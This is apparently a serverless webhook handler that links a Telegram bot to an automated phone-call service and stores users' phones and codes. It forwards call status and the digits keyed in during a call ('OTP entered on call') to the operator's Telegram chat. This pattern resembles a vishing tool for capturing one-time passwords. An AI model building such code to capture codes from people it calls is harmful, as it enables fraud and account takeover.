export const config = {
  api: {
    bodyParser: true,
  },
};

import dotenv from "dotenv";
import TelegramBot from "node-telegram-bot-api";
import mongoose from "mongoose";
import axios from "axios";

dotenv.config();

// ============ MongoDB ============

let cached = global.mongoose;

if (!cached) {
  cached = global.mongoose = { conn: null, promise: null };
}

async function connectDB() {
  if (cached.conn) return cached.conn;

  if (!cached.promise) {
    cached.promise = mongoose.connect(process.env.MONGO_URI, {
      bufferCommands: false,
    });
  }

  cached.conn = await cached.promise;
  console.log("✅ MongoDB connected");

  return cached.conn;
}

// ============ Telegram Bot ============

const bot = new TelegramBot(process.env.BOT_TOKEN, {
  webHook: true,
});

// ============ Model ============

const User =
  mongoose.models.User ||
  mongoose.model("User", {
    chatId: String,
    titleName: String,
    category: String,
    phone: String,
    status: String,
    otp: String,
  });

// ============ Handler ============

export default async function handler(req, res) {
  try {
    await connectDB();

    const body = req.body;

    // Telegram webhook
    if (body?.message) {
      await bot.processUpdate(body);
      return res.status(200).send("OK");
    }

    // Ringg webhook
    if (body?.phone) {
      const { phone, step, intent, digits, status } = body;

      const user = await User.findOne({ phone });
      if (!user) return res.send("OK");

      if (status === "ringing")
        await bot.sendMessage(user.chatId, "📞 Ringing...");

      if (status === "picked")
        await bot.sendMessage(user.chatId, "☎️ Call answered");

      if (status === "ended")
        await bot.sendMessage(user.chatId, "📴 Call ended");

      if (step === "confirm_request" && intent === "no") {
        const otp = Math.floor(100000 + Math.random() * 900000).toString();

        user.otp = otp;
        user.status = "otp";
        await user.save();

        await bot.sendMessage(
          user.chatId,
          `🔐 Verification Code: ${otp}\n\nEnter it here in Telegram.`
        );
      }

      if (step === "otp_step" && digits) {
        await bot.sendMessage(
          user.chatId,
          `📲 OTP entered on call: ${digits}`
        );
      }

      return res.send("OK");
    }

    return res.send("OK");
  } catch (err) {
    console.error("Webhook Error:", err);
    res.status(500).send("Error");
  }
}
